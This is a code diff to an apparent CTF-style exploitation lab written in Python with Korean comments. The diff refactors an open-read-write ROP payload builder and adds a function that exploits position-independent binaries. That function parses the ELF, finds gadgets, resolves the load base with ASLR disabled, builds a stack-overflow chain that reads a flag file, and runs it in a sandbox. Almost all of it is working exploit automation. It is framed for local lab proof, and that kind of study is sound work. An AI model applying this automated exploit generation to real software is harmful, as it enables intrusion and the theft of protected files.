@@ -18,10 +18,44 @@ from pathlib import Path
 from pwnable_lab.analyzer.strategy import find_string, is_pie, orw_plan
 from pwnable_lab.elf.parser import parse_elf
 from pwnable_lab.payload.pack import RopStep, build_overflow
-from pwnable_lab.sandbox.runner import SandboxLimits, run_with_input
+from pwnable_lab.sandbox.runner import SandboxLimits, resolve_pie_base, run_with_input
 
 # open/read/write 시스템콜 번호(amd64).
 _SYS_OPEN, _SYS_READ, _SYS_WRITE = 2, 0, 1
+
+
+def _orw_payload(plan: dict, flag_addr: int, offset: int, read_size: int) -> bytes:
+    """ORW open→read→write syscall ROP payload 를 만든다(주소는 이미 해석된 상태)."""
+
+    buf = plan["buf"]
+
+    def call(nr: int, a: int, b: int, c: int) -> list[RopStep]:
+        return [
+            RopStep(plan["pop_rdi"]),
+            RopStep(a),
+            RopStep(plan["pop_rsi"]),
+            RopStep(b),
+            RopStep(plan["pop_rdx"]),
+            RopStep(c),
+            RopStep(plan["pop_rax"]),
+            RopStep(nr),
+            RopStep(plan["syscall"]),
+        ]
+
+    chain = (
+        call(_SYS_OPEN, flag_addr, 0, 0)
+        + call(_SYS_READ, 3, buf, read_size)
+        + call(_SYS_WRITE, 1, buf, read_size)
+    )
+    return build_overflow(offset, chain[0].value, bits=64, chain=chain[1:])
+
+
+def _judge(stdout: bytes, expect_marker: str | None) -> tuple[bool, str]:
+    if expect_marker is not None:
+        ok = expect_marker.encode() in stdout
+        return ok, ("flag-leaked" if ok else "marker-not-found")
+    ok = len(stdout.strip(b"\x00").strip()) > 0
+    return ok, ("output-captured" if ok else "no-output")
 
 
 def auto_orw(
@@ -56,44 +90,16 @@ def auto_orw(
         return {"attempted": False, "reason": "flag-path-not-in-binary"}
 
     limits = limits or SandboxLimits()
-    buf = plan["buf"]
-
-    def call(nr: int, a: int, b: int, c: int) -> list[RopStep]:
-        return [
-            RopStep(plan["pop_rdi"]),
-            RopStep(a),
-            RopStep(plan["pop_rsi"]),
-            RopStep(b),
-            RopStep(plan["pop_rdx"]),
-            RopStep(c),
-            RopStep(plan["pop_rax"]),
-            RopStep(nr),
-            RopStep(plan["syscall"]),
-        ]
-
-    # open(flag, 0, 0) → fd 3(관례) ; read(3, buf, N) ; write(1, buf, N)
-    chain = (
-        call(_SYS_OPEN, flag_addr, 0, 0)
-        + call(_SYS_READ, 3, buf, read_size)
-        + call(_SYS_WRITE, 1, buf, read_size)
-    )
-    payload = build_overflow(offset, chain[0].value, bits=64, chain=chain[1:])
-
+    payload = _orw_payload(plan, flag_addr, offset, read_size)
     obs = run_with_input(binary_path, payload, capture_stdout=True, limits=limits)
     leaked = obs.stdout or b""
-    if expect_marker is not None:
-        succeeded = expect_marker.encode() in leaked
-        reason = "flag-leaked" if succeeded else "marker-not-found"
-    else:
-        succeeded = len(leaked.strip(b"\x00").strip()) > 0
-        reason = "output-captured" if succeeded else "no-output"
-
+    succeeded, reason = _judge(leaked, expect_marker)
     return {
         "attempted": True,
         "technique": "orw",
         "offset": offset,
         "flag_addr_hex": f"0x{flag_addr:x}",
-        "buf_hex": f"0x{buf:x}",
+        "buf_hex": f"0x{plan['buf']:x}",
         "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
         "syscall_hex": f"0x{plan['syscall']:x}",
         "succeeded": succeeded,
@@ -103,4 +109,63 @@ def auto_orw(
     }
 
 
-__all__ = ["auto_orw"]
+def auto_orw_pie(
+    binary_path: str,
+    *,
+    offset: int,
+    flag_path: str,
+    read_size: int = 100,
+    expect_marker: str | None = None,
+    limits: SandboxLimits | None = None,
+) -> dict:
+    """PIE 판 ORW: 로드 base 를 로컬 관측(ASLR-off)해 rebase 한 뒤 플래그를 유출한다.
+
+    non-PIE 판과 달리 가젯·문자열·버퍼가 base 상대이므로, :func:`resolve_pie_base` 로
+    관측한 base 로 전부 rebase 한다. 같은 ASLR-off 조건에서 실행해 관측·검증 base 가
+    일치한다(로컬 익스 증명, 원격 ASLR 우회 아님 → ``aslr="disabled-for-local-proof"``).
+    """
+
+    image = parse_elf(Path(binary_path).read_bytes())
+    if (image.bits or 64) != 64:
+        return {"attempted": False, "reason": "amd64-only"}
+    if not is_pie(image):
+        return {"attempted": False, "reason": "not-pie"}
+
+    plan = orw_plan(image)
+    if plan is None:
+        return {"attempted": False, "reason": "no-orw-plan"}
+    flag_off = find_string(image, flag_path.encode() + b"\x00") or find_string(
+        image, flag_path.encode()
+    )
+    if flag_off is None:
+        return {"attempted": False, "reason": "flag-path-not-in-binary"}
+
+    limits = limits or SandboxLimits()
+    base_res = resolve_pie_base(binary_path, limits=limits)
+    if not base_res.confirmed or base_res.base is None:
+        return {"attempted": False, "reason": "pie-base-unresolved"}
+    base = base_res.base
+
+    rebased = {k: base + v for k, v in plan.items()}
+    payload = _orw_payload(rebased, base + flag_off, offset, read_size)
+    obs = run_with_input(
+        binary_path, payload, capture_stdout=True, limits=limits, disable_aslr=True
+    )
+    leaked = obs.stdout or b""
+    succeeded, reason = _judge(leaked, expect_marker)
+    return {
+        "attempted": True,
+        "technique": "orw-pie",
+        "offset": offset,
+        "base_hex": f"0x{base:x}",
+        "flag_addr_hex": f"0x{base + flag_off:x}",
+        "buf_hex": f"0x{rebased['buf']:x}",
+        "succeeded": succeeded,
+        "reason": reason,
+        "aslr": "disabled-for-local-proof",
+        "leaked": leaked.split(b"\x00", 1)[0].decode("utf-8", "replace"),
+        "leaked_hex": leaked[:256].hex(),
+    }
+
+
+__all__ = ["auto_orw", "auto_orw_pie"]
